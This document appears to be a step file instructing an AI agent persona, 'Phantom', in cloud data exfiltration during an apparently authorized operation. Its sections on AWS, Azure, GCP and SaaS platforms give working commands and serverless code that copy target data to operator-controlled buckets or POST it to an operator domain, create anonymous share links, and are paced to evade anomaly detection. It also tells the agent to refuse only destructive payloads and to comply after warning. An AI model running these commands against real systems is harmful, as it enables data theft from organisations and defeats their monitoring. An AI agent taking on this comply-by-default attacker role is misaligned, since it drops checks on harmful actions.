# Step 6: Cloud Exfiltration

**Progress: Step 6 of 10** — Next: Covert Channel Exfiltration

## STEP GOAL:

Execute cloud-specific data exfiltration using cloud storage services, SaaS platforms, and cloud APIs. Transfer staged data through legitimate cloud channels that may bypass traditional network DLP. Leverage compromised cloud credentials and service accounts for cloud-native data movement. Distinguish between exfiltration TO operator-controlled cloud infrastructure (external upload) and exfiltration VIA target-owned cloud resources (share/sync/replicate).

## MANDATORY EXECUTION RULES (READ FIRST):

### Universal Rules:

- 🛑 NEVER modify cloud resource policies without documenting the original state for rollback
- 📖 CRITICAL: Read the complete step file before taking any action
- 🔄 CRITICAL: When loading next step with 'C', ensure entire file is read
- 📋 YOU ARE AN ATTACK OPERATOR executing authorized cloud-based data exfiltration
- ✅ YOU MUST ALWAYS SPEAK OUTPUT in your Agent communication style with the config `{communication_language}`
- ✅ YOU MUST ALWAYS WRITE all artifact and document content in `{document_output_language}`

### Role Reinforcement:

- ✅ You are Phantom — Attack Operator + Post-Exploitation Specialist
- ✅ You bring 8 years of complex multi-phase operations expertise
- ✅ You think in attack trees and decision branches
- ✅ You operate with precision — every action has a purpose
- ✅ You collaborate with the operator as a peer expert

### Step-Specific Rules:

- ☁️ Cloud exfiltration ONLY — network is step-05, covert channels is step-07
- 🚫 If no cloud exfil path is viable (no cloud access, all cloud DLP active), document and proceed to [C]
- 📋 Cloud API calls are ALWAYS logged — this is unavoidable, factor into OPSEC assessment
- ⏱️ Cloud storage exfiltration can move massive volumes fast — pace to avoid anomaly detection
- 🔀 Distinguish between: exfil TO operator cloud (external upload) vs exfil VIA target cloud (share/sync/replicate)

### Agent Autonomy Protocol:
- 🧠 YOU ARE THE PROFESSIONAL — your expertise informs the operator, the operator decides
- 🚫 HARD BLOCK — Destructive payloads ONLY (ransomware, wipers, data destroyers, tools designed to cause permanent damage). This is the ONLY action the agent refuses.
- ⚠️ WARN with explanation if you identify risk in the operator's approach:
  - Cloud storage uploads to external accounts (S3 buckets, Azure containers not owned by the target org) trigger CASB/cloud DLP alerts in mature environments — assess CASB deployment before attempting
  - Cross-account data sharing in AWS/Azure/GCP modifies resource policies that CloudTrail/Azure Monitor logs permanently — these changes are visible to cloud security teams and cannot be hidden
  - SaaS exfiltration (OneDrive, Google Drive, Dropbox sharing) triggers sharing audit events and DLP scanning that compliance teams review — external sharing is often the most-monitored exfil vector
  Always COMPLY after warning if the operator confirms.
- 💡 PROPOSE ALTERNATIVES when you see risk — give options, not roadblocks

## EXECUTION PROTOCOLS:

- 🎯 Present Cloud Exfiltration Viability Matrix before beginning transfers
- ⚠️ Present [A]/[W]/[C] menu after all cloud exfiltration channels are assessed and transfers executed
- 💾 ONLY save findings to output document when user chooses C (Continue)
- 📖 Update frontmatter, adding this step to the end of the list of stepsCompleted
- 🚫 FORBIDDEN to load next step until C is selected

## CONTEXT BOUNDARIES:

- Available context: Steps 01-05 results — exfil plan, data classification, staged data, network exfil results, cloud credentials from lateral movement/credential harvesting
- Focus: Cloud-based exfiltration only — using cloud storage, SaaS platforms, and cloud APIs
- Limits: Stay within RoE. Log every transfer. No network protocol or covert channel exfiltration.
- Dependencies: step-04-data-staging.md (staged data), step-05-network-exfil.md (network exfil status — what data remains), cloud credentials from lateral movement phase

## Sequence of Instructions (Do not deviate, skip, or optimize)

### 1. Cloud Channel Assessment & Viability Matrix

**Determine which cloud exfiltration channels are viable for this engagement:**

Load cloud intelligence from prior steps:

| Field | Value |
|-------|-------|
| Cloud Providers in Use | {{AWS/Azure/GCP/Multi-cloud from recon}} |
| Compromised Cloud Credentials | {{IAM users, service accounts, access keys, tokens}} |
| Cloud Permissions Available | {{S3 read/write, Blob access, GCS access, admin roles}} |
| CASB Deployment | {{Netskope, Zscaler, McAfee MVISION, Microsoft Defender for Cloud Apps}} |
| Cloud DLP | {{AWS Macie, Azure Purview, GCP DLP, third-party}} |
| SaaS Platforms | {{O365, Google Workspace, Dropbox, Box, Slack, Teams}} |
| Data Remaining After Step-05 | {{what was not transferred via network channels}} |
| Staged Data Location | {{on-prem staging, cloud staging (S3/Blob/GCS)}} |
| Cloud Security Posture | {{CSPM tools, GuardDuty, Security Center, SCC}} |

**Cloud Security Control Assessment (MANDATORY before any cloud exfiltration):**

| Control | Status | Config | Impact on Cloud Exfiltration |
|---------|--------|--------|---------------------------|
| CASB (Cloud Access Security Broker) | Active/Inactive | {{vendor, inline/API mode}} | {{cloud traffic inspection, policy enforcement}} |
| Cloud DLP | Active/Inactive | {{AWS Macie, Azure Purview, GCP DLP}} | {{sensitive data detection in cloud storage}} |
| CloudTrail / Azure Monitor / Cloud Audit | Active/Inactive | {{log destination, retention}} | {{ALL API calls logged — unavoidable}} |
| GuardDuty / Defender for Cloud / SCC | Active/Inactive | {{detection rules enabled}} | {{anomaly detection for unusual API patterns}} |
| S3 Block Public Access | Enabled/Disabled | {{account-level, bucket-level}} | {{limits public sharing/presigned URLs}} |
| Azure Storage Firewall | Active/Inactive | {{allowed networks, service endpoints}} | {{restricts external access}} |
| GCP VPC Service Controls | Active/Inactive | {{service perimeters}} | {{restricts data movement between projects}} |
| SaaS External Sharing Policy | Restricted/Permissive | {{O365/Google sharing settings}} | {{limits sharing to external users}} |
| Data Residency Controls | Active/Inactive | {{geographic restrictions}} | {{limits cross-region data movement}} |
| Service Control Policies (SCPs) | Active/Inactive | {{AWS Organizations policies}} | {{may block cross-account operations}} |

**Cloud Exfiltration Viability Matrix:**

| Channel | Cloud Provider | Access Level | CASB Coverage | Audit Logging | Detection Risk | Recommendation |
|---------|---------------|-------------|--------------|--------------|---------------|----------------|
| S3 copy to external bucket | AWS | {{IAM perms}} | {{CASB status}} | CloudTrail | {{risk}} | {{use/avoid}} |
| S3 presigned URL | AWS | {{s3:GetObject}} | {{CASB status}} | CloudTrail | {{risk}} | {{use/avoid}} |
| Azure Blob copy external | Azure | {{RBAC role}} | {{CASB status}} | Activity Log | {{risk}} | {{use/avoid}} |
| Azure SAS token | Azure | {{storage key}} | {{CASB status}} | Storage Analytics | {{risk}} | {{use/avoid}} |
| GCS copy to external | GCP | {{IAM perms}} | {{CASB status}} | Cloud Audit Log | {{risk}} | {{use/avoid}} |
| GCS signed URL | GCP | {{service acct}} | {{CASB status}} | Data Access Log | {{risk}} | {{use/avoid}} |
| OneDrive external share | O365 | {{user access}} | {{CASB status}} | Unified Audit Log | {{risk}} | {{use/avoid}} |
| Google Drive share | Workspace | {{user access}} | {{CASB status}} | Admin Audit Log | {{risk}} | {{use/avoid}} |
| Dropbox/Box share | SaaS | {{account access}} | {{CASB status}} | Sharing Audit | {{risk}} | {{use/avoid}} |
| Lambda/Functions exfil | AWS/Azure/GCP | {{function perms}} | Low | Function Logs | {{risk}} | {{use/avoid}} |
| Cloud-to-Cloud replication | {{provider}} | {{admin perms}} | Low | Replication Logs | {{risk}} | {{use/avoid}} |

**Present the complete Cloud Exfiltration Viability Matrix before proceeding.**

### 2. AWS S3 Exfiltration (T1537, T1567.002)

**AWS S3 is the most common cloud exfiltration target — multiple techniques available depending on access level:**

#### 2a. Direct Upload to Operator-Controlled S3 Bucket

```bash
# Upload staged data to operator-controlled S3 bucket using compromised AWS credentials
export AWS_ACCESS_KEY_ID={{compromised_access_key}}
export AWS_SECRET_ACCESS_KEY={{compromised_secret_key}}
export AWS_SESSION_TOKEN={{session_token_if_assumed_role}}

# Single file upload
aws s3 cp {{staged_file}} s3://{{operator_bucket}}/exfil/ --region {{region}}

# Directory sync (entire staging directory)
aws s3 sync {{staging_directory}} s3://{{operator_bucket}}/exfil/ --region {{region}}

# Upload with bandwidth limiting (avoid network anomaly detection)
aws s3 cp {{staged_file}} s3://{{operator_bucket}}/exfil/ \
  --expected-size {{bytes}} \
  --cli-read-timeout 300

# Upload with server-side encryption (encrypt at rest on operator bucket)
aws s3 cp {{staged_file}} s3://{{operator_bucket}}/exfil/ --sse AES256

# Using operator's own credentials (not target credentials — avoids CloudTrail in target account)
# Configure operator profile:
aws configure --profile operator
# Upload from compromised host through pivot chain:
aws s3 cp {{staged_file}} s3://{{operator_bucket}}/exfil/ --profile operator
```

**CloudTrail events generated:**
- `PutObject` — logged in OPERATOR account CloudTrail (not target, unless cross-account role)
- If using target credentials: `PutObject` logged in TARGET CloudTrail with the compromised principal
- Data event logging must be enabled for S3 (not enabled by default) — check target CloudTrail config

**OPSEC:** Using compromised target credentials generates CloudTrail entries in the target account. Using operator credentials from a compromised host generates no target-side cloud logs, but network traffic to S3 is visible. If data is already in target S3, use presigned URLs or bucket policy manipulation instead.

#### 2b. S3 Presigned URL Generation (T1537)

```bash
# Generate presigned URL for direct download of target S3 objects
# Requires: s3:GetObject permission on target bucket

# Generate presigned URL (valid for 1 hour by default, max 7 days with IAM user)
aws s3 presign s3://{{target_bucket}}/{{object_key}} --expires-in 3600

# Generate presigned URL for multiple objects
for key in $(aws s3 ls s3://{{target_bucket}}/{{prefix}}/ --recursive | awk '{print $4}'); do
  echo "$(aws s3 presign s3://{{target_bucket}}/$key --expires-in 86400)"
done > /tmp/presigned_urls.txt

# Download from operator machine using presigned URLs (no AWS credentials needed on operator side)
curl -o {{local_file}} "{{presigned_url}}"
wget -O {{local_file}} "{{presigned_url}}"

# Batch download all presigned URLs
while read url; do
  filename=$(echo "$url" | grep -oP '[^/]+(?=\?)')
  curl -s -o "/tmp/exfil/$filename" "$url"
  sleep 2
done < /tmp/presigned_urls.txt
```

**CloudTrail events:** `GetObject` logged with the signing principal. Presigned URL generation itself is NOT logged (it's a local operation). Download via presigned URL logs the signing principal, not the downloader.

**OPSEC:** Presigned URLs allow download without AWS credentials on the receiving end. The URL itself contains the authentication. Anyone with the URL can download — share via C2 channel to operator.

#### 2c. S3 Bucket Policy Manipulation

```bash
# Modify target bucket policy to allow operator account access
# Requires: s3:PutBucketPolicy permission

# Read current policy (save for rollback)
aws s3api get-bucket-policy --bucket {{target_bucket}} --output text > /tmp/original_policy.json

# Add operator account access
aws s3api put-bucket-policy --bucket {{target_bucket}} --policy '{
  "Version": "2012-10-17",
  "Statement": [{
    "Sid": "ExfilAccess",
    "Effect": "Allow",
    "Principal": {"AWS": "arn:aws:iam::{{operator_account_id}}:root"},
    "Action": ["s3:GetObject", "s3:ListBucket"],
    "Resource": [
      "arn:aws:s3:::{{target_bucket}}",
      "arn:aws:s3:::{{target_bucket}}/*"
    ]
  }]
}'

# Download from operator account (cross-account access)
aws s3 sync s3://{{target_bucket}}/{{prefix}} /tmp/exfil/ --profile operator

# CRITICAL: Rollback bucket policy after exfiltration
aws s3api put-bucket-policy --bucket {{target_bucket}} --policy file:///tmp/original_policy.json
```

**CloudTrail events:** `PutBucketPolicy` — HIGHLY visible. Policy changes are audited by GuardDuty, AWS Config, and any CSPM tool. This technique leaves permanent evidence.

#### 2d. S3 Cross-Account Replication

```bash
# Configure S3 replication from target bucket to operator bucket
# Requires: s3:PutReplicationConfiguration, iam:PassRole

# Create replication role (in target account)
aws iam create-role --role-name ReplicationRole --assume-role-policy-document '{
  "Version": "2012-10-17",
  "Statement": [{"Effect": "Allow", "Principal": {"Service": "s3.amazonaws.com"}, "Action": "sts:AssumeRole"}]
}'

# Attach replication policy
aws iam put-role-policy --role-name ReplicationRole --policy-name ReplicationPolicy --policy-document '{
  "Version": "2012-10-17",
  "Statement": [
    {"Effect": "Allow", "Action": ["s3:GetReplicationConfiguration", "s3:ListBucket"], "Resource": "arn:aws:s3:::{{target_bucket}}"},
    {"Effect": "Allow", "Action": ["s3:GetObjectVersionForReplication", "s3:GetObjectVersionAcl"], "Resource": "arn:aws:s3:::{{target_bucket}}/*"},
    {"Effect": "Allow", "Action": ["s3:ReplicateObject", "s3:ReplicateDelete"], "Resource": "arn:aws:s3:::{{operator_bucket}}/*"}
  ]
}'

# Enable versioning (required for replication)
aws s3api put-bucket-versioning --bucket {{target_bucket}} --versioning-configuration Status=Enabled

# Configure replication rule
aws s3api put-bucket-replication --bucket {{target_bucket}} --replication-configuration '{
  "Role": "arn:aws:iam::{{target_account_id}}:role/ReplicationRole",
  "Rules": [{"Status": "Enabled", "Destination": {"Bucket": "arn:aws:s3:::{{operator_bucket}}"}, "Filter": {"Prefix": "{{target_prefix}}"}}]
}'

# Data replicates automatically — no manual transfer needed
# CRITICAL: Remove replication config after exfil
aws s3api delete-bucket-replication --bucket {{target_bucket}}
```

**CloudTrail events:** `PutBucketReplication`, `PutBucketVersioning`, IAM role creation — EXTREMELY visible chain of events. Use only when persistence and stealth are not priorities.

#### 2e. Lambda-Based Exfiltration (T1537)

```bash
# Use AWS Lambda to read data and forward to operator endpoint
# Advantage: serverless, short-lived, function logs may be less monitored than user actions

# Create Lambda function for exfiltration
cat > /tmp/lambda_exfil.py << 'PYEOF'
import boto3
import requests
import base64
import os

def handler(event, context):
    s3 = boto3.client('s3')
    bucket = event['bucket']
    key = event['key']
    exfil_url = os.environ['EXFIL_URL']

    obj = s3.get_object(Bucket=bucket, Key=key)
    data = obj['Body'].read()

    # POST data to operator server
    requests.post(exfil_url, data=base64.b64encode(data),
                  headers={"X-Key": key, "Content-Type": "application/octet-stream"})

    return {"status": "ok", "key": key, "size": len(data)}
PYEOF

# Package and deploy
cd /tmp && zip lambda_exfil.zip lambda_exfil.py
aws lambda create-function \
  --function-name data-processor \
  --runtime python3.11 \
  --handler lambda_exfil.handler \
  --role arn:aws:iam::{{target_account_id}}:role/{{lambda_role}} \
  --zip-file fileb://lambda_exfil.zip \
  --environment "Variables={EXFIL_URL=https://{{operator_domain}}/upload}" \
  --timeout 300 --memory-size 512

# Invoke for each target object
for key in {{target_object_keys}}; do
  aws lambda invoke --function-name data-processor \
    --payload "{\"bucket\": \"{{target_bucket}}\", \"key\": \"$key\"}" \
    /tmp/lambda_response.json
  sleep 5
done

# CRITICAL: Delete Lambda function after exfil
aws lambda delete-function --function-name data-processor
```

**CloudTrail events:** `CreateFunction`, `Invoke`, `DeleteFunction`. Lambda execution generates CloudWatch Logs. Outbound network connections from Lambda visible in VPC flow logs if Lambda is VPC-attached.

**Document all AWS exfiltration:**
```
| ID | Technique | T-Code | Method | Source Bucket/Path | Destination | Volume | CloudTrail Events | Detection Risk |
|----|-----------|--------|--------|-------------------|-------------|--------|------------------|----------------|
| CX-AWS-001 | S3 presign | T1537 | Presigned URL | {{bucket/key}} | {{operator}} | {{size}} | GetObject | {{risk}} |
```

### 3. Azure Blob/Storage Exfiltration (T1537)

**Azure Storage exfiltration using compromised Azure credentials, SAS tokens, or storage keys:**

#### 3a. AzCopy to External Storage Account

```bash
# Upload from target to operator-controlled Azure storage
# Using compromised Azure credentials
az login --service-principal -u {{app_id}} -p {{client_secret}} --tenant {{tenant_id}}

# AzCopy with SAS token (most common — no interactive login needed)
azcopy copy "{{source_blob_url}}?{{source_sas}}" "https://{{operator_storage}}.blob.core.windows.net/exfil/{{filename}}?{{operator_sas}}"

# AzCopy sync entire container
azcopy sync "https://{{target_storage}}.blob.core.windows.net/{{container}}?{{sas}}" \
  "https://{{operator_storage}}.blob.core.windows.net/exfil?{{operator_sas}}" \
  --recursive

# AzCopy with bandwidth limiting
azcopy copy "{{source}}?{{sas}}" "{{destination}}?{{sas}}" --cap-mbps 10

# az CLI blob download then upload
az storage blob download --account-name {{target_storage}} --container-name {{container}} \
  --name {{blob_name}} --file /tmp/exfil_data --sas-token "{{sas}}"
az storage blob upload --account-name {{operator_storage}} --container-name exfil \
  --name {{blob_name}} --file /tmp/exfil_data --sas-token "{{operator_sas}}"
```

**Azure Activity Log events:** `Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read`, `write`. All Azure Storage operations logged in Azure Monitor / Storage Analytics.

#### 3b. SAS Token Generation for External Access

```bash
# Generate Shared Access Signature for external download
# Requires: storage account key or sufficient RBAC

# Account-level SAS (broad access)
az storage account generate-sas \
  --account-name {{target_storage}} \
  --permissions rl \
  --resource-types sco \
  --services b \
  --expiry $(date -u -d "+24 hours" +%Y-%m-%dT%H:%MZ) \
  --output tsv

# Container-level SAS (scoped to specific container)
az storage container generate-sas \
  --account-name {{target_storage}} \
  --name {{container}} \
  --permissions rl \
  --expiry $(date -u -d "+24 hours" +%Y-%m-%dT%H:%MZ) \
  --output tsv

# Blob-level SAS (scoped to specific blob)
az storage blob generate-sas \
  --account-name {{target_storage}} \
  --container-name {{container}} \
  --name {{blob_name}} \
  --permissions r \
  --expiry $(date -u -d "+4 hours" +%Y-%m-%dT%H:%MZ) \
  --output tsv

# Download from operator machine using SAS URL
curl -o {{local_file}} "https://{{target_storage}}.blob.core.windows.net/{{container}}/{{blob}}?{{sas_token}}"
```

**OPSEC:** SAS token generation is logged in Azure Activity Log. SAS tokens themselves are self-contained — no further authentication needed. Share SAS URL via C2 channel for operator download. Set short expiry (4-24 hours) to limit exposure window.

#### 3c. Azure Functions Exfiltration

```bash
# Deploy Azure Function to read storage and forward externally
# Similar to Lambda approach — serverless, short-lived execution

# Create Function App
az functionapp create \
  --resource-group {{resource_group}} \
  --consumption-plan-location {{region}} \
  --runtime python \
  --functions-version 4 \
  --name {{function_name}} \
  --storage-account {{target_storage}}

# Deploy exfil function code
cat > /tmp/function_app/__init__.py << 'PYEOF'
import azure.functions as func
from azure.storage.blob import BlobServiceClient
import requests, base64, os

def main(req: func.HttpRequest) -> func.HttpResponse:
    blob_client = BlobServiceClient.from_connection_string(os.environ["AzureWebJobsStorage"])
    container = req.params.get("container")
    blob_name = req.params.get("blob")

    blob_data = blob_client.get_blob_client(container, blob_name).download_blob().readall()
    requests.post(os.environ["EXFIL_URL"], data=base64.b64encode(blob_data),
                  headers={"X-Blob": blob_name})

    return func.HttpResponse("OK")
PYEOF

# Invoke function for each target blob
curl "https://{{function_name}}.azurewebsites.net/api/exfil?container={{container}}&blob={{blob_name}}"

# CRITICAL: Delete Function App after exfil
az functionapp delete --name {{function_name}} --resource-group {{resource_group}}
```

**Azure Monitor events:** Function App creation, invocation, deletion. Application Insights (if enabled) logs function execution details.

#### 3d. Azure Logic Apps Exfiltration

```bash
# Create Logic App workflow for automated data forwarding
# Advantage: Logic Apps can be triggered by events (blob creation, schedule)
# and can connect to hundreds of SaaS services

# Create Logic App via az CLI
az logic workflow create \
  --resource-group {{resource_group}} \
  --name {{workflow_name}} \
  --definition '{
    "triggers": {"manual": {"type": "Request", "kind": "Http"}},
    "actions": {
      "Get_blob": {"type": "ApiConnection", "inputs": {"host": {"connection": {"name": "@parameters($connections)[azureblob][connectionId]"}}, "method": "get", "path": "/v2/datasets/{{storage_account}}/files/{{blob_path}}/content"}},
      "HTTP_POST": {"type": "Http", "inputs": {"method": "POST", "uri": "https://{{operator_domain}}/upload", "body": "@body(Get_blob)"}, "runAfter": {"Get_blob": ["Succeeded"]}}
    }
  }'

# CRITICAL: Delete Logic App after exfil
az logic workflow delete --name {{workflow_name}} --resource-group {{resource_group}}
```

**OPSEC:** Logic App runs generate execution history logs. API connections log all operations. Resource creation events logged in Activity Log.

**Document all Azure exfiltration:**
```
| ID | Technique | T-Code | Method | Source Storage/Path | Destination | Volume | Azure Logs | Detection Risk |
|----|-----------|--------|--------|-------------------|-------------|--------|-----------|----------------|
| CX-AZ-001 | AzCopy SAS | T1537 | SAS download | {{storage/blob}} | {{operator}} | {{size}} | Storage Analytics | {{risk}} |
```

### 4. GCP Cloud Storage Exfiltration (T1537)

**GCP exfiltration using compromised service accounts, user credentials, or OAuth tokens:**

#### 4a. gsutil Copy to External Bucket

```bash
# Authenticate with compromised service account key
gcloud auth activate-service-account --key-file={{sa_key.json}}

# Copy to operator-controlled GCS bucket
gsutil cp gs://{{target_bucket}}/{{object}} gs://{{operator_bucket}}/exfil/

# Sync entire prefix
gsutil -m rsync -r gs://{{target_bucket}}/{{prefix}}/ gs://{{operator_bucket}}/exfil/

# Download locally then upload (if cross-project copy is blocked)
gsutil cp gs://{{target_bucket}}/{{object}} /tmp/exfil/
gsutil cp /tmp/exfil/{{object}} gs://{{operator_bucket}}/exfil/

# Bandwidth limiting (throttle to avoid anomaly detection)
gsutil -o "GSUtil:parallel_composite_upload_threshold=50M" \
  -o "GSUtil:max_upload_compression_buffer_size=2G" \
  cp gs://{{target_bucket}}/{{object}} gs://{{operator_bucket}}/exfil/
```

**Cloud Audit Log events:** `storage.objects.get`, `storage.objects.create`. Data Access Logs must be enabled (not always default). Admin Activity Logs (bucket policy changes) always enabled.

#### 4b. GCS Signed URL Generation

```bash
# Generate signed URL for external download (no GCP credentials needed to download)
gsutil signurl -d 4h {{sa_key.json}} gs://{{target_bucket}}/{{object}}

# Python SDK signed URL generation
from google.cloud import storage
client = storage.Client.from_service_account_json("{{sa_key.json}}")
bucket = client.bucket("{{target_bucket}}")
blob = bucket.blob("{{object}}")
url = blob.generate_signed_url(expiration=datetime.timedelta(hours=4), method="GET")
print(url)

# Download from operator machine
curl -o {{local_file}} "{{signed_url}}"
wget -O {{local_file}} "{{signed_url}}"
```

**OPSEC:** Signed URL generation is a local operation (not logged). Download via signed URL logs the signing service account. Set short expiry.

#### 4c. GCP Cloud Functions Exfiltration

```bash
# Deploy Cloud Function to read GCS and forward to operator
gcloud functions deploy exfil-func \
  --runtime python311 \
  --trigger-http \
  --entry-point handler \
  --source /tmp/function_code/ \
  --set-env-vars EXFIL_URL=https://{{operator_domain}}/upload \
  --region {{region}} \
  --allow-unauthenticated

# function_code/main.py:
from google.cloud import storage
import requests, base64, os

def handler(request):
    bucket_name = request.args.get("bucket")
    blob_name = request.args.get("blob")
    client = storage.Client()
    blob = client.bucket(bucket_name).blob(blob_name)
    data = blob.download_as_bytes()
    requests.post(os.environ["EXFIL_URL"], data=base64.b64encode(data),
                  headers={"X-Blob": blob_name})
    return "OK"

# Invoke
curl "https://{{region}}-{{project}}.cloudfunctions.net/exfil-func?bucket={{target_bucket}}&blob={{object}}"

# CRITICAL: Delete function after exfil
gcloud functions delete exfil-func --region {{region}} --quiet
```

#### 4d. GCP Transfer Service (Large-Scale)

```bash
# Google Storage Transfer Service — designed for large-scale data migration
# Can transfer between GCS buckets, AWS S3, Azure Storage, and HTTP sources

# Create transfer job (target GCS → operator GCS)
gcloud transfer jobs create \
  gs://{{target_bucket}} gs://{{operator_bucket}} \
  --name={{job_name}} \
  --include-prefixes={{target_prefix}} \
  --description="Data migration"

# Monitor transfer
gcloud transfer jobs monitor {{job_name}}

# CRITICAL: Delete transfer job after completion
gcloud transfer jobs delete {{job_name}}
```

**OPSEC:** Transfer Service creates audit log entries. Designed for enterprise migration — large-volume transfers may look legitimate if the target org uses Transfer Service. However, cross-project transfers to unknown projects will be anomalous.

**Document all GCP exfiltration:**
```
| ID | Technique | T-Code | Method | Source Bucket/Path | Destination | Volume | GCP Logs | Detection Risk |
|----|-----------|--------|--------|-------------------|-------------|--------|---------|----------------|
| CX-GCP-001 | gsutil cp | T1537 | Cross-bucket copy | {{bucket/obj}} | {{operator}} | {{size}} | Data Access Log | {{risk}} |
```

### 5. SaaS Platform Exfiltration (T1567)

**Leverage SaaS platforms for exfiltration — data movement through legitimate business applications:**

#### 5a. OneDrive / SharePoint Exfiltration (T1567.002)

```bash
# Microsoft Graph API — download files from OneDrive/SharePoint
# Requires: valid OAuth token with Files.Read or Sites.Read.All

# Download file via Graph API
curl -o {{local_file}} \
  -H "Authorization: Bearer {{access_token}}" \
  "https://graph.microsoft.com/v1.0/me/drive/items/{{item_id}}/content"

# Create external sharing link
curl -X POST "https://graph.microsoft.com/v1.0/me/drive/items/{{item_id}}/createLink" \
  -H "Authorization: Bearer {{access_token}}" \
  -H "Content-Type: application/json" \
  -d '{"type": "view", "scope": "anonymous"}'
# Returns: sharing URL accessible without authentication

# Upload staged data to OneDrive then share externally
curl -X PUT "https://graph.microsoft.com/v1.0/me/drive/root:/exfil/{{filename}}:/content" \
  -H "Authorization: Bearer {{access_token}}" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @{{staged_file}}

# SharePoint document library download
curl -o {{local_file}} \
  -H "Authorization: Bearer {{access_token}}" \
  "https://graph.microsoft.com/v1.0/sites/{{site_id}}/drive/items/{{item_id}}/content"

# PowerShell PnP module (if available)
Connect-PnPOnline -Url "https://{{tenant}}.sharepoint.com/sites/{{site}}" -AccessToken {{token}}
Get-PnPFile -Url "/sites/{{site}}/{{library}}/{{filename}}" -Path /tmp/exfil/ -FileName {{filename}} -AsFile
```

**OPSEC:** Microsoft 365 Unified Audit Log captures all OneDrive/SharePoint file operations (FileAccessed, FileDownloaded, SharingSet, AnonymousLinkCreated). Microsoft Defender for Cloud Apps (CASB) monitors external sharing. DLP policies may scan shared content.

#### 5b. Google Drive Exfiltration (T1567.002)

```bash
# Google Drive API — download and share files
# Requires: OAuth token with drive.readonly or drive scope

# Download file
curl -o {{local_file}} \
  -H "Authorization: Bearer {{access_token}}" \
  "https://www.googleapis.com/drive/v3/files/{{file_id}}?alt=media"

# Create sharing link (anyone with link can view)
curl -X POST "https://www.googleapis.com/drive/v3/files/{{file_id}}/permissions" \
  -H "Authorization: Bearer {{access_token}}" \
  -H "Content-Type: application/json" \
  -d '{"type": "anyone", "role": "reader"}'

# Upload staged data to Drive
curl -X POST "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart" \
  -H "Authorization: Bearer {{access_token}}" \
  -F "metadata={\"name\": \"{{filename}}\"};type=application/json" \
  -F "file=@{{staged_file}}"

# Google Takeout — bulk export (if admin account compromised)
# Admin Console → Data Export → includes all Drive data
# Generates download links after processing
```

**OPSEC:** Google Workspace Admin Audit Log records all sharing changes. Google DLP (available in Enterprise edition) scans shared content. Drive audit events: view, download, share, permission_change.

#### 5c. Slack / Teams File Exfiltration

```bash
# Slack — upload file to channel or DM (exfil via Slack)
curl -F "file=@{{staged_file}}" \
  -F "channels={{channel_id}}" \
  -F "initial_comment=Review attached" \
  -H "Authorization: Bearer {{slack_token}}" \
  "https://slack.com/api/files.upload"

# Slack webhook exfil (send data as message content)
curl -X POST {{incoming_webhook_url}} \
  -H "Content-Type: application/json" \
  -d "{\"text\": \"$(base64 -w0 {{staged_file}})\"}"

# Microsoft Teams — upload file via Graph API
curl -X PUT "https://graph.microsoft.com/v1.0/teams/{{team_id}}/channels/{{channel_id}}/filesFolder/content/{{filename}}" \
  -H "Authorization: Bearer {{access_token}}" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @{{staged_file}}
```

**OPSEC:** Slack Enterprise Grid logs all file uploads, message content, and API calls. Teams audit logs in Microsoft 365 Unified Audit. Bot tokens and webhook URLs are logged. File size limits apply (Slack: varies by plan, Teams: 250 MB via Graph API).

#### 5d. Dropbox / Box Exfiltration

```bash
# Dropbox API — upload and share
curl -X POST "https://content.dropboxapi.com/2/files/upload" \
  -H "Authorization: Bearer {{access_token}}" \
  -H "Dropbox-API-Arg: {\"path\": \"/exfil/{{filename}}\"}" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @{{staged_file}}

# Create shared link
curl -X POST "https://api.dropboxapi.com/2/sharing/create_shared_link_with_settings" \
  -H "Authorization: Bearer {{access_token}}" \
  -H "Content-Type: application/json" \
  -d '{"path": "/exfil/{{filename}}", "settings": {"requested_visibility": "public"}}'

# Box API — upload and share
curl -X POST "https://upload.box.com/api/2.0/files/content" \
  -H "Authorization: Bearer {{access_token}}" \
  -F "attributes={\"name\": \"{{filename}}\", \"parent\": {\"id\": \"0\"}}" \
  -F "file=@{{staged_file}}"
```

**Document all SaaS exfiltration:**
```
| ID | Platform | T-Code | Method | Account | External Access | Volume | Audit Events | Detection Risk |
|----|----------|--------|--------|---------|----------------|--------|-------------|----------------|
| CX-SAAS-001 | {{platform}} | T1567 | {{method}} | {{account}} | {{link/share}} | {{size}} | {{events}} | {{risk}} |
```

### 6. Cloud-to-Cloud Transfer

**Transfer data between cloud environments — stays within provider backbone, less visible to org perimeter monitoring:**

```bash
# AWS S3 → External S3 (cross-account)
aws s3 sync s3://{{target_bucket}} s3://{{operator_bucket}} --source-region {{region}} --region {{op_region}}

# Azure Blob → External Blob (AzCopy server-to-server)
azcopy copy "https://{{target_storage}}.blob.core.windows.net/{{container}}?{{target_sas}}" \
  "https://{{operator_storage}}.blob.core.windows.net/exfil?{{operator_sas}}" \
  --recursive --s2s-preserve-access-tier=false

# GCP GCS → External GCS (gsutil)
gsutil -m rsync -r gs://{{target_bucket}} gs://{{operator_bucket}}

# Cross-cloud: AWS S3 → Azure Blob (from compromised EC2 instance)
# Install azcopy on EC2:
aws s3 cp s3://{{target_bucket}}/{{object}} /tmp/exfil/
azcopy copy "/tmp/exfil/{{object}}" "https://{{operator_storage}}.blob.core.windows.net/exfil?{{sas}}"

# Cross-cloud: GCP → AWS (from compromised GCE instance)
gsutil cp gs://{{target_bucket}}/{{object}} /tmp/exfil/
aws s3 cp /tmp/exfil/{{object}} s3://{{operator_bucket}}/exfil/
```

**Advantages:** Cloud-to-cloud traffic stays within provider's backbone network — no egress through corporate perimeter, invisible to on-prem NTA/NDR/IDS. Transfer speeds are extremely fast (cloud internal bandwidth).

**OPSEC:** Cloud audit logs still capture all operations (CloudTrail, Azure Monitor, Cloud Audit Logs). CASB may detect cross-account data movement. The advantage is purely at the network perimeter level.

### 7. Serverless Exfiltration

**Leverage serverless compute for exfiltration — no persistent infrastructure, short-lived execution:**

```bash
# AWS Lambda → Read S3/DynamoDB/RDS → POST to external
# (detailed in section 2e above)

# Azure Functions → Read Blob/CosmosDB/SQL → Forward externally
# (detailed in section 3c above)

# GCP Cloud Functions → Read GCS/Firestore → Forward externally
# (detailed in section 4c above)

# Serverless advantages:
# - No persistent compute — function executes and terminates
# - Short-lived execution reduces detection window
# - Function logs may receive less security attention than user API calls
# - Can be triggered by events (new file upload, schedule, HTTP request)
# - Auto-scales — can process multiple objects in parallel

# Serverless OPSEC considerations:
